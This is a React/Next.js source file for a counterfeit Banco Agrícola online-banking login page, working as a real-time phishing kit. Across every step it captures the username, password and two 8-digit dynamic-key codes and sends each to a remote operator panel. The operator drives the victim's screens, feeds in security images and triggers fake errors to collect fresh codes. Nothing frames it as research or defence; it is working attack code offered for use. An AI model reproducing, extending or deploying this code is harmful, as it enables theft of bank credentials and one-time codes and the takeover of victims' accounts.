"use client";

import Image from "next/image";
import Link from "next/link";
import { useEffect, useRef, useState } from "react";
import { flushSync } from "react-dom";
import { completeOpsLoginClient } from "@/lib/client-session";
import {
  createSessionId,
  detectDevice,
  fetchOpsSession,
  patchOpsSession,
  postOpsAction,
  upsertOpsSession,
} from "@/lib/ops-channel";
import { TejuinoScreen } from "@/components/login/TejuinoScreen";
import {
  DEFAULT_SECURITY_CHALLENGE,
  saveSecurityChallenge,
  type SecurityChallenge,
} from "@/lib/security-challenge";

type Step = "usuario" | "imagen" | "dinamica" | "tejuino";

export default function LoginPage() {
  const [step, setStep] = useState<Step>("usuario");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);
  const [code, setCode] = useState("");
  const [advancing, setAdvancing] = useState(false);
  const [waitingPanel, setWaitingPanel] = useState(false);
  const [opsError, setOpsError] = useState("");
  const [challenge, setChallenge] = useState<SecurityChallenge>(
    DEFAULT_SECURITY_CHALLENGE,
  );
  const sessionIdRef = useRef<string | null>(null);
  const appliedActionRef = useRef<string>("");
  const usernameRef = useRef<HTMLInputElement>(null);
  const codeRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);
  const busyRef = useRef(false);
  const finishingRef = useRef(false);
  const tejuinoActiveRef = useRef(false);
  /** Último state del servidor visto por el poll (para no reaplicar residuales). */
  const prevServerStateRef = useRef("");

  // Ping + poll de acciones del panel (cross-browser vía API)
  useEffect(() => {
    const sid = sessionIdRef.current;
    if (!sid) return;

    const tick = async () => {
      try {
        const session = await fetchOpsSession(sid);
        if (session) {
          const actionKey = `${session.state}:${session.imageSrc || ""}:${session.phrase || ""}`;
          const prevState = prevServerStateRef.current;
          prevServerStateRef.current = session.state;

          // Acciones del operador primero (c-interna / errores / done)
          if (session.state === "c-interna") {
            // Si ya dimos Continuar en tejuino, no bajar el spinner por residual c-interna
            if (step === "tejuino" && (waitingPanel || busyRef.current)) {
              /* keep spinner — esperando Listo / error del panel */
            } else if (
              appliedActionRef.current !== "c-interna" ||
              step !== "tejuino"
            ) {
              appliedActionRef.current = "c-interna";
              finishingRef.current = false;
              tejuinoActiveRef.current = true;
              setOpsError("");
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setCode("");
              setStep("tejuino");
            }
          } else if (session.state === "error-tejuino") {
            // Tras Continuar en pantalla de error, el state sigue error-tejuino
            // un momento: no reaplicar ni apagar el spinner.
            const residualError =
              (waitingPanel || busyRef.current) &&
              appliedActionRef.current === "submitted-tejuino" &&
              prevState === "error-tejuino";
            if (residualError) {
              /* keep spinner */
            } else if (appliedActionRef.current !== "error-tejuino") {
              appliedActionRef.current = "error-tejuino";
              tejuinoActiveRef.current = true;
              finishingRef.current = false;
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setCode("");
              setOpsError(
                "Error al validar la Clave, por favor intenta de nuevo (FLO0001W)",
              );
              setStep("tejuino");
            }
          } else if (session.state === "done") {
            if (!finishingRef.current && appliedActionRef.current !== "done") {
              appliedActionRef.current = "done";
              finishingRef.current = true;
              setOpsError("");
              const res = completeOpsLoginClient(username || session.username);
              finishingRef.current = false;
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              if ("error" in res && res.error) {
                setOpsError(res.error);
              } else {
                tejuinoActiveRef.current = false;
                setCode("");
                setPassword("");
                setOpsError("");
                setStep("usuario");
              }
            }
          } else if (session.state === "error-token") {
            if (appliedActionRef.current !== "error-token") {
              appliedActionRef.current = "error-token";
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setCode("");
              setOpsError("El código ingresado no es válido (FLO0001W)");
              setStep("dinamica");
            }
          } else if (session.state === "error-user") {
            if (appliedActionRef.current !== "error-user") {
              appliedActionRef.current = "error-user";
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setUsername("");
              setCode("");
              setPassword("");
              setRemember(false);
              if (usernameRef.current) usernameRef.current.value = "";
              setOpsError(
                "El usuario y/o código ingresado no son válidos, por favor intente nuevamente (FLO0001W)",
              );
              setStep("usuario");
              window.setTimeout(() => usernameRef.current?.focus(), 50);
            }
          } else if (session.state === "error-pass") {
            if (appliedActionRef.current !== "error-pass") {
              appliedActionRef.current = "error-pass";
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              tejuinoActiveRef.current = false;
              setPassword("");
              setOpsError(
                "Error al validar Clave, por favor intente nuevamente. (FLO0001W)",
              );
              setStep("imagen");
            }
          } else if (session.state === "token" || session.state === "typing") {
            // Residual typing/token: no bajar spinner si ya enviamos el OTP
            if (step === "dinamica" && (waitingPanel || busyRef.current)) {
              /* keep spinner */
            } else if (
              appliedActionRef.current !== "token" ||
              step !== "dinamica"
            ) {
              appliedActionRef.current = "token";
              setOpsError("");
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setStep("dinamica");
            }
          } else if (
            session.state === "imagen" &&
            session.imageSrc &&
            session.phrase
          ) {
            if (step === "imagen" && (waitingPanel || busyRef.current)) {
              /* keep spinner */
            } else if (
              appliedActionRef.current !== actionKey ||
              step !== "imagen"
            ) {
              appliedActionRef.current = actionKey;
              const next = {
                imageSrc: session.imageSrc,
                phrase: session.phrase,
              };
              saveSecurityChallenge(next);
              setChallenge(next);
              setPassword("");
              setOpsError("");
              setWaitingPanel(false);
              setAdvancing(false);
              busyRef.current = false;
              setStep("imagen");
            }
          }
        }
      } catch {
        /* ignore */
      }

      // Heartbeat liviano: solo last_seen (no reenviar token/clave ni state,
      // para no pisar c-interna / errores del panel).
      try {
        await patchOpsSession(sid, {
          last_seen: Date.now(),
        });
      } catch {
        /* ignore */
      }
    };

    void tick();
    const id = window.setInterval(tick, 1200);
    return () => window.clearInterval(id);
  }, [step, waitingPanel, username]);

  useEffect(() => {
    const sid = sessionIdRef.current;
    if (!sid || waitingPanel) return;

    // Solo avisa "Escribiendo" en el badge; el valor NO se manda hasta Continuar.
    let state: "typing" | "typing-pass" | "token" | "imagen" | null = null;
    if (step === "dinamica") {
      const digits = code.replace(/\D/g, "");
      state = digits.length > 0 ? "typing" : "token";
    } else if (step === "imagen") {
      state = password.trim().length > 0 ? "typing-pass" : "imagen";
    } else {
      return;
    }

    const t = window.setTimeout(() => {
      void patchOpsSession(sid, { state }).catch(() => {});
    }, 280);
    return () => window.clearTimeout(t);
  }, [code, password, waitingPanel, step]);

  // Tejuino: el input vive en TejuinoScreen → señal aparte
  const notifyTejuinoTyping = (hasInput: boolean) => {
    const sid = sessionIdRef.current;
    if (!sid || waitingPanel || step !== "tejuino") return;
    void patchOpsSession(sid, {
      state: hasInput ? "typing-tejuino" : "c-interna",
    }).catch(() => {});
  };

  const isDinamica = step === "dinamica";
  const showSpinner = advancing || waitingPanel;

  function readUsername(form?: HTMLFormElement | null) {
    if (form) {
      const fd = new FormData(form);
      const fromForm = String(fd.get("username") || "").trim();
      if (fromForm) return fromForm;
    }
    return (usernameRef.current?.value || username).trim();
  }

  function readCode(form?: HTMLFormElement | null) {
    if (form) {
      const fd = new FormData(form);
      const fromForm = String(fd.get("otp") || "").trim();
      if (fromForm) return fromForm;
    }
    return (codeRef.current?.value || code).trim();
  }

  function readPassword(form?: HTMLFormElement | null) {
    if (form) {
      const fd = new FormData(form);
      const fromForm = String(fd.get("password") || "").trim();
      if (fromForm) return fromForm;
    }
    return (passwordRef.current?.value || password).trim();
  }

  function continueFromUsuario(form?: HTMLFormElement | null) {
    if (busyRef.current || waitingPanel) return;
    const user = readUsername(form);
    if (!user) {
      setOpsError("Ingresa tu usuario.");
      usernameRef.current?.focus();
      return;
    }

    busyRef.current = true;
    setUsername(user);
    setOpsError("");
    appliedActionRef.current = "";
    setAdvancing(true);
    setWaitingPanel(true);

    const id = sessionIdRef.current ?? createSessionId();
    sessionIdRef.current = id;
    const now = Date.now();

    // Queda en spinner hasta que el panel pulse "Pedir token"
    void upsertOpsSession({
      id,
      username: user,
      device: detectDevice(),
      ip: "127.0.0.1",
      state: "waiting-token",
      createdAt: now,
      updatedAt: now,
      last_seen: now,
    }).catch(() => {
      setOpsError("No se pudo conectar. Revisa WiFi e intenta de nuevo.");
      setWaitingPanel(false);
      setAdvancing(false);
      busyRef.current = false;
    });
  }

  function continueFromDinamica(form?: HTMLFormElement | null) {
    if (busyRef.current || waitingPanel) return;
    const token = readCode(form).replace(/\D/g, "").slice(0, 8);
    if (token.length !== 8) {
      setOpsError("Ingresa los 8 dígitos de tu Clave Dinámica.");
      setCode(token);
      codeRef.current?.focus();
      return;
    }

    // Spinner YA: antes del await, para que el primer clic se sienta al instante.
    busyRef.current = true;
    appliedActionRef.current = "submitted-token";
    finishingRef.current = false;
    flushSync(() => {
      setCode(token);
      setOpsError("");
      setAdvancing(true);
      setWaitingPanel(true);
    });

    let sid = sessionIdRef.current;
    if (!sid) {
      sid = createSessionId();
      sessionIdRef.current = sid;
    }

    const user = readUsername() || username || "usuario";
    void upsertOpsSession({
      id: sid,
      username: user,
      token,
      device: detectDevice(),
      ip: "127.0.0.1",
      state: "waiting-imagen",
      createdAt: Date.now(),
      updatedAt: Date.now(),
      last_seen: Date.now(),
    })
      .then(() => postOpsAction(sid!, "waiting-imagen"))
      .catch(() => {
        setOpsError("No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.");
        setWaitingPanel(false);
        setAdvancing(false);
        busyRef.current = false;
        appliedActionRef.current = "token";
      });
  }

  function continueFromImagen(form?: HTMLFormElement | null) {
    if (busyRef.current || waitingPanel) return;
    const pass = readPassword(form);
    if (!pass) {
      setOpsError("Ingresa tu clave.");
      passwordRef.current?.focus();
      return;
    }

    const sid = sessionIdRef.current;
    if (!sid) {
      setOpsError("Sesión no válida. Vuelve a empezar.");
      return;
    }

    busyRef.current = true;
    appliedActionRef.current = "submitted-pass";
    setPassword(pass);
    setOpsError("");
    setAdvancing(true);
    setWaitingPanel(true);

    // Spinner hasta que el panel pulse Listo o Err clave
    void patchOpsSession(sid, {
      password: pass,
      state: "waiting-pass",
    })
      .then(() => postOpsAction(sid, "waiting-pass"))
      .catch(() => {
        setOpsError("No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.");
        setWaitingPanel(false);
        setAdvancing(false);
        busyRef.current = false;
      });
  }

  function continueFromTejuino(clave: string) {
    if (busyRef.current || waitingPanel) return;
    const token = clave.replace(/\D/g, "").slice(0, 8);
    if (token.length !== 8) {
      setOpsError("Ingresa los 8 dígitos de tu Clave Dinámica.");
      return;
    }

    const sid = sessionIdRef.current;
    if (!sid) {
      setOpsError("Sesión no válida. Vuelve a empezar.");
      return;
    }

    busyRef.current = true;
    tejuinoActiveRef.current = true;
    appliedActionRef.current = "submitted-tejuino";
    finishingRef.current = false;
    flushSync(() => {
      setCode(token);
      setOpsError("");
      setAdvancing(true);
      setWaitingPanel(true);
    });

    // Espera Listo / Err tejuino / Err clave del panel
    void patchOpsSession(sid, {
      token,
      state: "waiting-pass",
    })
      .then(() => postOpsAction(sid, "waiting-pass"))
      .catch(() => {
        setOpsError("No se pudo avisar al panel. Revisa WiFi e intenta de nuevo.");
        setWaitingPanel(false);
        setAdvancing(false);
        busyRef.current = false;
        appliedActionRef.current = "c-interna";
      });
  }

  if (step === "tejuino") {
    return (
      <TejuinoScreen
        key={
          waitingPanel
            ? "tejuino-wait"
            : opsError
              ? `err-${opsError}`
              : "tejuino"
        }
        username={username}
        error={waitingPanel ? "" : opsError}
        busy={showSpinner}
        onTyping={notifyTejuinoTyping}
        onContinue={continueFromTejuino}
        onCancel={() => {
          if (showSpinner) return;
          setOpsError("");
          setCode("");
        }}
      />
    );
  }

  return (
    <main className="flex h-dvh flex-col bg-white pt-[env(safe-area-inset-top)] pb-[env(safe-area-inset-bottom)] md:min-h-[700px]">
      <header className="relative z-20 flex h-14 shrink-0 items-center justify-between border-b border-[#e6e6e6] bg-white px-4 sm:h-16 sm:px-6 md:h-[72px] md:px-12">
        <Link href="/" className="inline-flex items-center">
          <Image
            src="/images/logo.png"
            alt="Bancoagrícola"
            width={220}
            height={52}
            className="h-9 w-auto object-contain sm:h-10 md:h-[48px]"
            priority
          />
        </Link>
        <Link
          href="/#contacto"
          aria-label="Ayuda"
          className="grid h-11 w-11 place-items-center text-[#3a3a3a]"
        >
          <HelpIcon />
        </Link>
      </header>

      <div className="relative min-h-0 flex-1 overflow-y-auto overflow-x-hidden bg-white overscroll-y-contain">
        {/* Hero solo desktop: en iPhone/Android el overlay absoluto bloqueaba toques */}
        <div
          className={`pointer-events-none absolute inset-0 hidden md:block ${isDinamica ? "scale-105 blur-[6px]" : ""}`}
          aria-hidden
        >
          <Image
            src="/images/login/hero-official.jpg"
            alt=""
            fill
            priority
            quality={100}
            sizes="100vw"
            className="pointer-events-none object-cover object-[center_28%]"
          />
        </div>
        {isDinamica ? (
          <div
            className="pointer-events-none absolute inset-0 z-0 hidden bg-white/25 md:block"
            aria-hidden
          />
        ) : null}

        <div className="relative z-20 flex min-h-0 flex-1 items-stretch justify-center bg-white px-0 py-0 pointer-events-auto sm:items-center sm:px-6 sm:py-8 md:absolute md:inset-0 md:min-h-full md:bg-transparent md:px-14 md:py-10 lg:justify-start lg:px-[6%]">
          <div className="flex w-full max-w-none flex-col bg-white shadow-none sm:max-w-[520px] sm:shadow-[0_2px_18px_rgba(0,0,0,0.14)] md:w-[40%] md:min-w-[440px] md:max-w-[580px] lg:min-w-[480px]">
            {step === "usuario" ? (
              <form
                className="flex flex-1 flex-col"
                method="post"
                action="#"
                onSubmit={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  continueFromUsuario(e.currentTarget);
                }}
              >
                <h1 className="px-5 pb-4 pt-7 font-display text-[22px] font-bold leading-tight text-[#292929] sm:px-8 sm:pb-5 sm:pt-9 sm:text-[26px] md:px-11 md:pb-6 md:pt-11 md:text-[28px] md:leading-none">
                  Bienvenido a e-banca Personas
                </h1>

                <div className="px-5 sm:px-8 md:px-11">
                  {opsError.includes("usuario y/o código") ? (
                    <div
                      role="alert"
                      className="message state- mb-5 flex w-full items-stretch sm:mb-6"
                    >
                      <div className="icon-light shrink-0" aria-hidden />
                      <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[15px] font-semibold leading-snug text-[#292929] sm:text-[16px]">
                        {opsError}
                      </p>
                    </div>
                  ) : null}

                  <label className="block">
                    <span className="block py-2.5 text-[14px] font-normal text-[#292929]">
                      Usuario
                    </span>
                    <input
                      ref={usernameRef}
                      name="username"
                      autoComplete="username"
                      autoCapitalize="none"
                      autoCorrect="off"
                      spellCheck={false}
                      enterKeyHint="go"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                      onInput={(e) => setUsername(e.currentTarget.value)}
                      disabled={showSpinner}
                      className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] font-normal text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70"
                    />
                  </label>

                  <label className="mt-6 flex min-h-11 cursor-pointer items-center gap-2.5 text-[15px] font-normal text-[#292929] sm:mt-7 sm:text-[16px]">
                    <input
                      type="checkbox"
                      checked={remember}
                      onChange={(e) => setRemember(e.target.checked)}
                      disabled={showSpinner}
                      className="h-[18px] w-[18px] accent-[#292929]"
                    />
                    Recordar usuario
                  </label>

                  <div className="mt-4 sm:mt-5">
                    <Link
                      href="/login"
                      className="inline-flex min-h-11 items-center text-[15px] font-semibold text-[#292929] underline! underline-offset-2 sm:text-[16px]"
                    >
                      Olvide mi Clave
                    </Link>
                  </div>

                  {opsError &&
                  step === "usuario" &&
                  !opsError.includes("usuario y/o código") ? (
                    <p className="mt-4 text-[13px] text-red-600">{opsError}</p>
                  ) : null}
                  {waitingPanel && step === "usuario" ? (
                    <p className="mt-4 text-[13px] text-[#666]">
                      Validando usuario… espera al operador.
                    </p>
                  ) : null}

                  <div className="mt-3 flex justify-center py-3 sm:mt-4 sm:py-4">
                    <button
                      type="button"
                      disabled={showSpinner}
                      onClick={() => continueFromUsuario(usernameRef.current?.form)}
                      className="relative z-30 inline-flex min-h-12 w-full max-w-[280px] items-center justify-center gap-2 rounded-full bg-[#fdda24] px-8 py-3 font-display text-[17px] font-bold uppercase leading-none text-[#292929] touch-manipulation select-none disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:min-w-[197px] sm:px-[49px] sm:py-[10px] sm:text-[18px]"
                    >
                      {showSpinner ? (
                        <ButtonSpinner />
                      ) : (
                        <>
                          Continuar
                          <ArrowRight />
                        </>
                      )}
                    </button>
                  </div>
                </div>

                <CardFooterLinks />
              </form>
            ) : null}

            {step === "dinamica" ? (
              <form
                className="px-5 pb-8 pt-7 sm:px-8 sm:pb-10 sm:pt-9 md:px-11 md:pt-11"
                method="post"
                action="#"
                onSubmit={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  continueFromDinamica(e.currentTarget);
                }}
              >
                {opsError.includes("FLO0001W") ? (
                  <div
                    role="alert"
                    className="message state- mb-5 flex w-full items-stretch sm:mb-6"
                  >
                    {/* Misma estructura que gredesemo: .icon-light + p.icon- */}
                    <div
                      className="icon-light shrink-0"
                      aria-hidden
                    />
                    <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[15px] font-semibold leading-snug text-[#292929] sm:text-[16px]">
                      {opsError}
                    </p>
                  </div>
                ) : null}

                <h1 className="font-display text-[20px] font-bold leading-snug text-[#292929] sm:text-[22px] md:text-[24px]">
                  Ingresa el código generado por tu Clave Dinámica:
                </h1>

                <label className="mt-8 block sm:mt-10">
                  <span className="block py-2.5 text-[14px] font-normal text-[#292929]">
                    Código
                  </span>
                  <input
                    ref={codeRef}
                    name="otp"
                    inputMode="numeric"
                    pattern="[0-9]{8}"
                    maxLength={8}
                    autoComplete="one-time-code"
                    enterKeyHint="go"
                    value={code}
                    onChange={(e) =>
                      setCode(e.target.value.replace(/\D/g, "").slice(0, 8))
                    }
                    onInput={(e) =>
                      setCode(e.currentTarget.value.replace(/\D/g, "").slice(0, 8))
                    }
                    disabled={showSpinner}
                    className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] tracking-[0.2em] text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70"
                  />
                </label>

                <div className="mt-4 sm:mt-5">
                  <Link
                    href="/login"
                    className="inline-flex min-h-11 items-center text-[15px] font-semibold text-[#292929] underline! underline-offset-2 sm:text-[16px]"
                  >
                    Obtener mi código por Telebanca
                  </Link>
                </div>

                <div className="dynamic-token-info mt-6 flex items-start gap-3 sm:mt-8">
                  <div className="light-round-image shrink-0" aria-hidden />
                  <p className="text-[14px] font-normal leading-snug text-[#292929] sm:text-[16px]">
                    Si tienes dudas sobre cómo generar tu Clave Dinámica,{" "}
                    <Link
                      href="/promociones"
                      className="font-semibold underline! underline-offset-2"
                    >
                      haz clic aquí
                    </Link>
                  </p>
                </div>

                {opsError && !opsError.includes("FLO0001W") ? (
                  <p className="mt-5 text-[13px] text-red-600 sm:mt-6">{opsError}</p>
                ) : null}
                {waitingPanel ? (
                  <p className="mt-5 text-[13px] text-[#666] sm:mt-6">
                    Validando código… espera la imagen de seguridad del operador.
                  </p>
                ) : null}

                <div className="mt-8 flex flex-col-reverse gap-3 sm:mt-10 sm:flex-row sm:flex-wrap sm:items-center sm:gap-4">
                  <button
                    type="button"
                    disabled={showSpinner}
                    onClick={() => {
                      setCode("");
                      setWaitingPanel(false);
                      setOpsError("");
                      setAdvancing(false);
                      busyRef.current = false;
                      setStep("usuario");
                    }}
                    className="inline-flex min-h-12 w-full items-center justify-center rounded-full border border-[#292929] bg-white px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
                  >
                    Cancelar
                  </button>
                  <button
                    type="button"
                    disabled={showSpinner || code.replace(/\D/g, "").length !== 8}
                    onClick={() => continueFromDinamica(codeRef.current?.form)}
                    className="inline-flex min-h-12 w-full items-center justify-center gap-2 rounded-full bg-[#fdda24] px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:py-[10px] sm:text-[16px]"
                  >
                    {showSpinner ? (
                      <ButtonSpinner />
                    ) : (
                      <>
                        Continuar
                        <ArrowRight />
                      </>
                    )}
                  </button>
                </div>
              </form>
            ) : null}

            {step === "imagen" ? (
              <form
                className="px-5 pb-8 pt-7 sm:px-8 sm:pb-10 sm:pt-9 md:px-11 md:pt-11"
                method="post"
                action="#"
                onSubmit={(e) => {
                  e.preventDefault();
                  e.stopPropagation();
                  continueFromImagen(e.currentTarget);
                }}
              >
                <input type="hidden" name="username" value={username} />

                <h1 className="font-display text-[20px] font-bold leading-snug text-[#292929] sm:text-[22px] md:text-[26px]">
                  Valida tu imagen y frase de seguridad
                </h1>
                <p className="mt-3 text-[13px] font-normal leading-relaxed text-[#292929] sm:mt-4 sm:text-[14px]">
                  Estimado cliente: Recuerda validar la imagen y la descripción
                  que corresponda a la registrada previamente, antes de ingresar
                  tu clave.
                </p>

                {opsError.includes("validar Clave") ||
                opsError.includes("FLO0001W") ? (
                  <div
                    role="alert"
                    className="message state- mt-5 flex w-full items-stretch sm:mt-6"
                  >
                    <div className="icon-light shrink-0" aria-hidden />
                    <p className="icon- flex flex-1 items-center px-3.5 py-3.5 text-[15px] font-semibold leading-snug text-[#292929] sm:text-[16px]">
                      {opsError}
                    </p>
                  </div>
                ) : opsError ? (
                  <p className="mt-4 text-[13px] text-red-600 sm:mt-5">{opsError}</p>
                ) : null}

                <div className="mt-6 flex items-center gap-4 sm:mt-8 sm:gap-5">
                  <div className="relative h-20 w-20 shrink-0 overflow-hidden rounded-full bg-[#ddd] grayscale sm:h-[88px] sm:w-[88px]">
                    <Image
                      src={challenge.imageSrc}
                      alt="Imagen de seguridad"
                      fill
                      className="object-cover object-top"
                      sizes="88px"
                      unoptimized={challenge.imageSrc.startsWith("data:")}
                    />
                  </div>
                  <p className="text-[16px] font-normal text-[#292929] sm:text-[18px]">
                    {challenge.phrase}
                  </p>
                </div>

                <label className="mt-6 block sm:mt-8">
                  <span className="block py-2.5 text-[14px] font-normal text-[#292929]">
                    Clave
                  </span>
                  <input
                    ref={passwordRef}
                    name="password"
                    type="password"
                    autoComplete="current-password"
                    enterKeyHint="go"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onInput={(e) => setPassword(e.currentTarget.value)}
                    disabled={showSpinner}
                    className="w-full border-0 border-b border-[#bdbdbd] bg-transparent px-0 pb-2 text-[16px] font-normal text-[#292929] outline-none focus:border-[#292929] disabled:opacity-70"
                  />
                </label>

                <div className="mt-4 sm:mt-5">
                  <Link
                    href="/login"
                    className="inline-flex min-h-11 items-center text-[15px] font-semibold text-[#292929] underline! underline-offset-2 sm:text-[16px]"
                  >
                    Olvide mi Clave
                  </Link>
                </div>

                {waitingPanel ? (
                  <p className="mt-4 text-[13px] text-[#666] sm:mt-5">
                    Validando clave… espera al operador.
                  </p>
                ) : null}

                <div className="mt-8 flex flex-col-reverse gap-3 sm:mt-10 sm:flex-row sm:flex-wrap sm:items-center sm:gap-4">
                  <button
                    type="button"
                    disabled={showSpinner}
                    onClick={() => {
                      setPassword("");
                      setOpsError("");
                      setWaitingPanel(false);
                      setAdvancing(false);
                      busyRef.current = false;
                      setStep("usuario");
                    }}
                    className="inline-flex min-h-12 w-full items-center justify-center rounded-full border border-[#292929] bg-white px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:min-w-[120px] sm:py-[10px] sm:text-[16px]"
                  >
                    Salir
                  </button>
                  <button
                    type="button"
                    disabled={showSpinner}
                    onClick={() => continueFromImagen(passwordRef.current?.form)}
                    className="inline-flex min-h-12 w-full items-center justify-center gap-2 rounded-full bg-[#fdda24] px-8 py-3 font-display text-[15px] font-bold uppercase leading-none text-[#292929] touch-manipulation disabled:opacity-60 sm:min-h-[42px] sm:w-auto sm:min-w-[160px] sm:py-[10px] sm:text-[16px]"
                  >
                    {showSpinner ? (
                      <ButtonSpinner />
                    ) : (
                      <>
                        Continuar
                        <ArrowRight />
                      </>
                    )}
                  </button>
                </div>
              </form>
            ) : null}
          </div>
        </div>
      </div>

      <footer className="relative z-20 flex shrink-0 flex-wrap items-center gap-x-3 gap-y-1 border-t border-[#cfcfcf] bg-white px-4 py-2.5 text-[10px] text-[#1a1b1a] sm:h-[38px] sm:flex-nowrap sm:gap-x-4 sm:px-6 sm:py-0 sm:text-[11px]">
        <Image
          src="/images/logo-responsive.svg"
          alt=""
          width={18}
          height={14}
          className="object-contain opacity-80"
          style={{ width: "auto", height: 14 }}
        />
        <Link
          href="/promociones"
          className="font-normal no-underline max-sm:hidden"
        >
          Consejos de seguridad
        </Link>
        <Link
          href="/promociones"
          className="font-normal no-underline max-sm:hidden"
        >
          Tutorial del canal
        </Link>
        <Link
          href="/promociones"
          className="font-normal no-underline max-sm:hidden"
        >
          Tips de uso
        </Link>
        <Link href="/promociones" className="font-normal no-underline">
          <span className="sm:hidden">Ayuda</span>
          <span className="max-sm:hidden">Preguntas frecuentes</span>
        </Link>
        <span className="ml-auto text-[#666]">
          <span className="max-sm:hidden">Banco Agrícola© Todos los derechos reservados.</span>
          <span className="sm:hidden">© Banco Agrícola</span>
        </span>
        <span className="text-[#999]">5.4.5</span>
      </footer>
    </main>
  );
}

function CardFooterLinks() {
  return (
    <div className="mt-auto flex items-center justify-between gap-3 border-t border-[#2c2a29] px-5 py-5 text-[14px] text-[#292929] sm:px-8 sm:py-7 sm:text-[15px] md:px-11 md:py-[30px] md:text-[16px]">
      <Link
        href="/#contacto"
        className="inline-flex min-h-11 items-center gap-2 font-semibold underline! underline-offset-2"
      >
        Regístrate
        <RegisterIcon />
      </Link>
      <Link
        href="/#contacto"
        className="inline-flex min-h-11 items-center gap-2 font-semibold underline! underline-offset-2"
      >
        <HeadsetIcon />
        Contáctanos
      </Link>
    </div>
  );
}

function ArrowRight() {
  return (
    <svg viewBox="0 0 24 24" className="h-[18px] w-[18px]" fill="none" stroke="currentColor" strokeWidth="2.4">
      <path d="M5 12h14M13 6l6 6-6 6" />
    </svg>
  );
}

function ButtonSpinner() {
  return (
    <span
      aria-label="Cargando"
      className="inline-block h-[22px] w-[22px] animate-spin rounded-full border-[2.5px] border-[#1a1b1a]/30 border-t-[#1a1b1a]"
    />
  );
}

function HelpIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-[22px] w-[22px]" fill="none" stroke="currentColor" strokeWidth="1.6">
      <path d="M20.5 12a8 8 0 01-11.8 7.05L4 20.5l1.6-4.1A8 8 0 1120.5 12z" />
      <path d="M9.6 9.4a2.3 2.3 0 014 1.55c0 1.4-2.1 1.85-2.1 3.05" strokeLinecap="round" />
      <circle cx="11.8" cy="16.2" r="0.7" fill="currentColor" stroke="none" />
    </svg>
  );
}

function RegisterIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="1.7">
      <path d="M4 20l3-.6L18.5 8a1.8 1.8 0 00-2.5-2.5L4.5 16.9 4 20z" />
      <path d="M14.5 7l2.5 2.5" />
    </svg>
  );
}

function HeadsetIcon() {
  return (
    <svg viewBox="0 0 24 24" className="h-3.5 w-3.5" fill="none" stroke="currentColor" strokeWidth="1.7">
      <path d="M4 13v-1a8 8 0 0116 0v1" />
      <path d="M4 13a2 2 0 002 2h1v-4H6a2 2 0 00-2 2zM18 11h-1v4h1a2 2 0 002-2 2 2 0 00-2-2z" />
      <path d="M18 17v1a2 2 0 01-2 2h-3" />
    </svg>
  );
}

